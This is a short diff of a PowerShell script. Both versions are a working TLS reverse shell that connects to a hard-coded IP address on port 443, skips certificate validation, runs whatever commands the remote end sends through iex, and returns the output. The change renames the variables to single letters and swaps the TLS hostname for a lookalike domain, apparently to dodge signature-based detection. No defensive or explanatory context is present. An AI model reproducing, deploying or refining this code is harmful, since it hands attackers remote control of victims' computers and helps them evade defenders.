@@ -1,14 +1,14 @@
-$socket = New-Object Net.Sockets.TcpClient('120.156.138.160', 443)
-$stream = $socket.GetStream()
-$sslStream = New-Object System.Net.Security.SslStream($stream,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
-$sslStream.AuthenticateAsClient('fake.domain', $null, "Tls12", $false)
-$writer = new-object System.IO.StreamWriter($sslStream)
-$writer.Write('PS ' + (pwd).Path + '> ')
-$writer.flush()
-[byte[]]$bytes = 0..65535|%{0};
-while(($i = $sslStream.Read($bytes, 0, $bytes.Length)) -ne 0)
-{$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
-$sendback = (iex $data | Out-String ) 2>&1;
-$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';
-$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
-$sslStream.Write($sendbyte,0,$sendbyte.Length);$sslStream.Flush()}
+$a = New-Object Net.Sockets.TcpClient('120.156.138.160', 443)
+$b = $a.GetStream()
+$c = New-Object System.Net.Security.SslStream($b,$false,({$True} -as [Net.Security.RemoteCertificateValidationCallback]))
+$c.AuthenticateAsClient('lvanhoe.com', $null, "Tls12", $false)
+$d = new-object System.IO.StreamWriter($c)
+$d.Write('PS ' + (pwd).Path + '> ')
+$d.flush()
+[byte[]]$e = 0..65535|%{0};
+while(($i = $c.Read($e, 0, $e.Length)) -ne 0)
+{$f = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($e,0, $i);
+$g = (iex $f | Out-String ) 2>&1;
+$g2 = $g + 'PS ' + (pwd).Path + '> ';
+$h = ([text.encoding]::ASCII).GetBytes($g2);
+$c.Write($h,0,$h.Length);$c.Flush()}
